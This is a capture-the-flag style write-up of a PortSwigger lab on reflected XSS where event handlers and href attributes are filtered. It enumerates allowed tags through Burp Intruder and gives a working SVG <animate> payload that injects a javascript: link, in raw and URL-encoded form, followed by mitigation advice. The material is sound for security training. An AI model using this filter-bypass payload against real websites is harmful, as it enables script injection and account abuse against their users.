# Reflected XSS with event handlers and href attributes blocked

**Source:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)  
**Category:** XSS  
**Difficulty:** EXPERT

## Objective
To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the `alert` function.

## Vulnerability
This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
```html
<a href="">Click me</a>
```

## Exploitation

### Steps

1. Entering the laboratory and sending the search form request to Intruder, then performing a `sniper attack` on all tags:

```http
GET /?search=§test§ HTTP/2
```

`Status 200` was returned for the following tags: `<a>`, `<svg>`, `<text>`, while the remaining ones returned `Status 400`.

2. Another `sniper attack` to check the allowed tag attributes:

```html
<a href="http://google.com">Click me</a>
<a href="javascript:alert(1)">Click me</a>
<a target="_blank">Click me</a>
<a target="javascript:alert(1)">Click me</a>
<a id="test">Click me</a>
<a class="test">Click me</a>
<a style="color:red">Click me</a>
<a name="test">Click me</a>
<a ping="test">Click me</a>
<a rel="test">Click me</a>
<a download="test">Click me</a>
<a hreflang="test">Click me</a>
<a type="test">Click me</a>
<a referrerpolicy="test">Click me</a>
<a media="test">Click me</a>
<a accesskey="x">Click me</a>
<a tabindex="1">Click me</a>
<a draggable="true">Click me</a>
<a contenteditable="true">Click me</a>
<svg>Click me</svg>
<svg xmlns="http://www.w3.org/2000/svg">Click me</svg>
<svg viewBox="0 0 100 100">Click me</svg>
<svg width="100" height="100">Click me</svg>
<svg onload="alert(1)">Click me</svg>
<text x="20" y="20">Click me</text>
<text font-family="Arial">Click me</text>
<text font-size="20">Click me</text>
<text fill="red">Click me</text>
<text stroke="black">Click me</text>
<text text-anchor="middle">Click me</text>
<text dominant-baseline="central">Click me</text>
```

The first two, `<a href="http://google.com">Click me</a>` and `<a href="javascript:alert(1)">Click me</a>`, should not work according to the lab description, but it is still worth adding them to verify the behavior.

`Status 200` was returned for all requests except three:

```html
<a href="http://google.com">Click me</a>
<a href="javascript:alert(1)">Click me</a>
<svg onload="alert(1)">Click me</svg>
```

3. `<svg onload="alert(1)">Click me</svg>` does not work, while the `<svg>` tag itself does. An attempt to place `<a href>` inside `<svg>`, by submitting `<svg><a href="javascript:alert(1)">Click me</a></svg>` through the search form, resulted in `"Attribute is not allowed"`.

4. An attempt to use `<animate>` by submitting `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x="20" y="20">Click me</text></a></svg>` worked and the lab was solved, so our attack URL would look as follows:

```http
/?search=<svg><a><animate+attributeName%3D"href"+values%3D"javascript%3Aalert%281%29"%2F><text+x%3D"20"+y%3D"20">Click+me<%2Ftext><%2Fa><%2Fsvg>
```

### Payload

```html
<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x="20" y="20">Click me</text></a></svg>
```

### Shortcut

1. Submit the following payload through the `search` form:

```html
<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x="20" y="20">Click me</text></a></svg>
```

2. Or just add payload to url: 

```http
/?search=<svg><a><animate+attributeName%3D"href"+values%3D"javascript%3Aalert%281%29"%2F><text+x%3D"20"+y%3D"20">Click+me<%2Ftext><%2Fa><%2Fsvg>`
```

## Impact

An attacker can execute arbitrary JavaScript in the context of the vulnerable application's origin when a victim follows the crafted URL and interacts with the injected element.

Depending on the application's functionality and security controls, this could allow an attacker to perform actions with the victim's privileges, access data available to client-side JavaScript, manipulate page content, or perform phishing attacks within the trusted application.

## Mitigation

User-controlled input should not be inserted into HTML without appropriate context-sensitive output encoding.

Relying on a blacklist or a limited set of blocked HTML tags and attributes is insufficient because HTML and SVG provide alternative mechanisms that may result in JavaScript execution.

Where HTML input is required, use a well-maintained HTML sanitizer with a strict allowlist of permitted elements and attributes. Dangerous SVG elements and attributes capable of modifying links or triggering script execution should be removed.

A restrictive Content Security Policy (CSP) can additionally reduce the impact of XSS vulnerabilities, but it should be treated as a defense-in-depth mechanism rather than a replacement for proper input handling and output encoding.

## Tools

- Burp Suite
- Intruder

## Notes

Blocking common XSS vectors such as event handlers and `href` attributes does not necessarily prevent XSS.

SVG introduces additional elements such as `<animate>` that can modify attributes dynamically. In this case, although a directly supplied `href` attribute is blocked, `<animate>` can assign the dangerous value to the anchor after the SVG is parsed.

Testing which tags and attributes are accepted separately helps identify alternative execution paths when common XSS payloads are filtered.